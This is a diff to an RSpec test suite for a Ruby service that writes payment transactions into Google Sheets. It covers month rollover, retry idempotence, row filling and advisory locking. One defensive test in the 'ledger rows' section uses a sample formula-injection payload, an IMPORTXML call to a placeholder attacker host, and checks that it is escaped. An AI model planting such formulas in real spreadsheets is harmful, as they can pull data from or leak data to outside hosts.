@@ -39,13 +39,27 @@ RSpec.describe Workbook::HelloSmcWriter do
     [ [ "Tên Đại lý", "Số tiền sau khi trừ phí gốc", "Số tiền giao dịch", "Phí gốc", "Ngày giao dịch", "Trạng thái" ] ]
   end
 
-  def memory(extra = {})
+  def memory(extra = {}, row_limits = {})
     Workbook::MemorySheet.new({
       "DS MB T10" => ds_mb_grid,
       "R&D Report" => rd_grid,
       "MB" => mb_grid,
       "Bill vô chủ" => bill_grid
-    }.merge(extra))
+    }.merge(extra), row_limits)
+  end
+
+  # Same shape as the real DS MB sheet: dates down column A, amounts beside
+  # them, a blank spacer row, then the "Tổng cộng" block of =sum formulas.
+  def october_grid
+    grid = [ [ "Thiên Kim GV", "Chương (tid1)", "Sơn(tid2)" ] ]
+    (1..31).each do |day|
+      grid << [ Date.new(2026, 10, day), (day == 1 ? 354_367_000 : nil), (day == 1 ? 239_332_000 : nil) ]
+    end
+    grid << []
+    grid << [ "Tổng cộng", "Thiên Kim GV" ]
+    grid << [ "Chương (tid1)", "=sum(B2:B32)" ]
+    grid << [ "Sơn(tid2)", "=sum(C2:C32)" ]
+    grid
   end
 
   def build_transaction(amount: 486_000, at: Time.zone.local(2026, 10, 1, 10, 0), rate: BigDecimal("0.0088"),
@@ -156,6 +170,16 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
     end
 
+    it "skips rejected transactions" do
+      transaction = build_transaction
+      transaction.update!(status: "rejected")
+      client = memory
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
+        .to eq(:skipped_rejected)
+      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
+      expect(WorkbookEntry.count).to eq(0)
+    end
+
     it "skips transactions without a transaction date" do
       transaction = build_transaction
       transaction.update!(transaction_at: nil)
@@ -174,21 +198,186 @@ RSpec.describe Workbook::HelloSmcWriter do
   end
 
   describe "month rollover" do
-    it "duplicates the latest sheet, rewrites November dates and clears amounts" do
-      create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345)
-      client = memory
-      described_class.call(
-        transaction: build_transaction(at: Time.zone.local(2026, 11, 1, 10, 0)),
-        client: client, spreadsheet_id: "sheet-id"
-      )
+    let(:november) { Time.zone.local(2026, 11, 3, 10, 0) }
+
+    before { create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345) }
+
+    it "builds the new month, clears last month's amounts and keeps the totals formulas" do
+      client = memory("DS MB T10" => october_grid)
+      described_class.call(transaction: build_transaction(at: november), client: client, spreadsheet_id: "sheet-id")
 
       expect(client.titles).to include("DS MB T11")
-      expect(client.cell("DS MB T11", "A2")).to eq("2026-11-01")
-      expect(client.cell("DS MB T11", "A3")).to eq("2026-11-02")
-      expect(client.cell("DS MB T11", "B2")).to eq(486_000)
-      expect(client.cell("DS MB T11", "B3")).to be_nil
-      # T10 unchanged
+      expect(client.titles.grep(/__setup_/)).to be_empty
+      expect(client.cell("DS MB T11", "A2")).to eq(Date.new(2026, 11, 1))
+      expect(client.cell("DS MB T11", "A31")).to eq(Date.new(2026, 11, 30))
+      expect(client.cell("DS MB T11", "A32")).to be_nil
+      expect(client.cell("DS MB T11", "B2")).to be_nil
+      expect(client.cell("DS MB T11", "C2")).to be_nil
+      expect(client.cell("DS MB T11", "B4")).to eq(486_000)
+      expect(client.cell("DS MB T11", "B35")).to eq("=sum(B2:B32)")
+      expect(client.cell("DS MB T11", "A35")).to eq("Chương (tid1)")
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
+    end
+
+    it "does not mistake small amounts for dates" do
+      grid = october_grid
+      grid[1][2] = 52_000
+      client = memory("DS MB T10" => grid)
+      described_class.call(transaction: build_transaction(at: november), client: client, spreadsheet_id: "sheet-id")
+      expect(client.cell("DS MB T11", "C2")).to be_nil
+    end
+
+    it "leaves no half-built month behind when the setup fails, and finishes on retry" do
+      client = memory("DS MB T10" => october_grid)
+      attempts = 0
+      allow(client).to receive(:batch_update_values).and_wrap_original do |original, updates|
+        attempts += 1
+        raise Google::Apis::TransmissionError, "boom" if attempts == 1
+
+        original.call(updates)
+      end
+      transaction = build_transaction(at: Time.zone.local(2026, 11, 1, 10, 0))
+
+      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
+        .to raise_error(Google::Apis::TransmissionError)
+      expect(client.titles).not_to include("DS MB T11")
+
+      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      expect(client.titles).to include("DS MB T11")
+      expect(client.titles.grep(/__setup_/)).to be_empty
+      expect(client.cell("DS MB T11", "B2")).to eq(486_000)
+      expect(WorkbookEntry.count).to eq(1)
+    end
+
+    it "keeps day 31 available when December is cloned from a 30-day November" do
+      client = memory("DS MB T10" => october_grid)
+      described_class.call(transaction: build_transaction(at: november), client: client, spreadsheet_id: "sheet-id")
+      described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 12, 31, 10, 0)),
+                           client: client, spreadsheet_id: "sheet-id")
+
+      expect(client.cell("DS MB T12", "A32")).to eq(Date.new(2026, 12, 31))
+      expect(client.cell("DS MB T12", "B32")).to eq(486_000)
+    end
+  end
+
+  describe "ledger rows" do
+    before { create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345) }
+
+    it "fills a blank row in the middle of MB instead of overwriting the row below" do
+      rows = mb_grid + [ [ 1000 ], [ 2000 ], [ 3000 ], [ 4000 ] ]
+      rows[2] = []
+      client = memory("MB" => rows)
+
+      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
+
+      expect(client.cell("MB", "A3")).to eq(486_000)
+      expect(client.cell("MB", "A4")).to eq(3000)
+      expect(WorkbookEntry.last.mb_row).to eq(3)
+    end
+
+    it "adds rows when MB is full instead of failing with a grid limit error" do
+      rows = mb_grid + (2..1000).map { |n| [ n ] }
+      client = memory({ "MB" => rows }, { "MB" => 1000 })
+
+      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
+
+      expect(client.cell("MB", "A1001")).to eq(486_000)
+      expect(WorkbookEntry.last.mb_row).to eq(1001)
+    end
+
+    it "writes the transaction marker and dates as literal text" do
+      client = memory
+      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
+      expect(client.cell("MB", "L2")).to match(/\ATX\d+\z/)
+      expect(client.cell("MB", "G2")).to eq("01/10/2026")
+      expect(client.cell("MB", "H2")).to eq("10:00:00")
+    end
+
+    it "does not add the amount twice when the batch was applied but the entry was not saved" do
+      client = memory
+      transaction = build_transaction
+      calls = 0
+      allow(WorkbookEntry).to receive(:create!).and_wrap_original do |original, *args|
+        calls += 1
+        raise ActiveRecord::StatementInvalid, "db down" if calls == 1
+
+        original.call(*args)
+      end
+
+      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
+        .to raise_error(ActiveRecord::StatementInvalid)
+      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000 + 486_000)
+
+      result = described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+
+      expect(result).to eq(:already_written)
+      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000 + 486_000)
+      expect(client.cell("MB", "A3")).to be_nil
+      expect(WorkbookEntry.count).to eq(1)
+      expect(WorkbookEntry.last.payload["issue"]).to eq("reconciled_after_retry")
+    end
+
+    it "does not add a second Bill vô chủ row on retry" do
+      client = memory
+      transaction = build_transaction
+      transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
+      transaction.merchant = nil
+      transaction.save!
+      calls = 0
+      allow(WorkbookEntry).to receive(:create!).and_wrap_original do |original, *args|
+        calls += 1
+        raise ActiveRecord::StatementInvalid, "db down" if calls == 1
+
+        original.call(*args)
+      end
+
+      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
+        .to raise_error(ActiveRecord::StatementInvalid)
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
+        .to eq(:already_written)
+      expect(client.cell("Bill vô chủ", "A3")).to be_nil
+      expect(WorkbookEntry.count).to eq(1)
+    end
+
+    it "writes OCR text that looks like a formula as literal text" do
+      client = memory
+      sent = nil
+      allow(client).to receive(:batch_update_values).and_wrap_original do |original, updates|
+        sent = updates
+        original.call(updates)
+      end
+      transaction = build_transaction
+      transaction.source_data = { "extraction" => { "merchant_name" => "=IMPORTXML(\"http://evil.example\",\"//a\")" } }
+      transaction.merchant = nil
+      transaction.save!
+
+      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+
+      expect(sent.first[:rows].first.first).to start_with("'=IMPORTXML")
+      expect(client.cell("Bill vô chủ", "A2")).to start_with("=IMPORTXML")
+    end
+  end
+
+  describe "daily cell lookup" do
+    it "never falls through into the table stacked below when the day is missing" do
+      create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345)
+      grid = [
+        [ "Thiên Kim GV", "Chương (tid1)" ],
+        [ Date.new(2026, 10, 1), 100 ],
+        [ "Tổng cộng", "Thiên Kim GV" ],
+        [],
+        [ "HKD AS CAFE", "Anh Hải (tid 1)" ],
+        [ Date.new(2026, 10, 1), 200 ],
+        [ Date.new(2026, 10, 2), 300 ]
+      ]
+      client = memory("DS MB T10" => grid)
+
+      result = described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 10, 2, 10, 0)),
+                                    client: client, spreadsheet_id: "sheet-id")
+
+      expect(result).to eq(:unidentified)
+      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_missing")
+      expect(client.cell("DS MB T10", "B7")).to eq(300)
     end
   end
 
@@ -213,13 +402,29 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000 + 100_000 + 200_000)
     end
 
-    it "issues a session advisory lock around the write" do
+    it "takes a session advisory lock around the write" do
       create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345)
+      transaction = build_transaction
       connection = Transaction.connection
+      allow(connection).to receive(:select_value).and_call_original
       allow(connection).to receive(:execute).and_call_original
-      described_class.call(transaction: build_transaction, client: memory, spreadsheet_id: "sheet-42")
-      expect(connection).to have_received(:execute).with(a_string_including("pg_advisory_lock"))
+      described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-42")
+      expect(connection).to have_received(:select_value).with(a_string_including("pg_try_advisory_lock"))
       expect(connection).to have_received(:execute).with(a_string_including("pg_advisory_unlock"))
+    end
+
+    it "raises LockBusy without writing when another writer holds the lock" do
+      create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345)
+      transaction = build_transaction
+      client = memory
+      connection = Transaction.connection
+      allow(connection).to receive(:select_value).and_call_original
+      allow(connection).to receive(:select_value).with(a_string_including("pg_try_advisory_lock")).and_return(false)
+
+      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-42") }
+        .to raise_error(described_class::LockBusy)
+      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
+      expect(WorkbookEntry.count).to eq(0)
     end
   end
 end
